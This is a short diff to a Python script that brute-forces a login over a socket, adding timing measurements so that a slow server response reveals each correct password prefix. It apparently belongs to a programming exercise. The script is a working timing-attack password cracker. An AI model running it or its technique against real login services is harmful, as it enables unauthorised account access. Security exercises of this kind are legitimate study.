@@ -97,6 +97,8 @@ import socket
 import string
 import sys
 import json
+import time
+from time import perf_counter
 
 NUMBERS = [str(x) for x in range(10)]
 LITERAS = list(string.ascii_letters)
@@ -138,13 +140,15 @@ with socket.socket() as my_s:
         for password in password_generator:
             msg = {"login": login, "password": password}
             msg_json = json.dumps(msg)
+            start = time.perf_counter()
             my_s.send(msg_json.encode())
             respond_json = my_s.recv(1024).decode('utf8')
+            end = time.perf_counter()
             respond = json.loads(respond_json)
             if respond['result'] == "Connection success!":
                 finished = True
                 break
-            elif respond['result'] == "Exception happened during login":
+            if end - start >= 0.09:
                 prefix = password
                 break
 
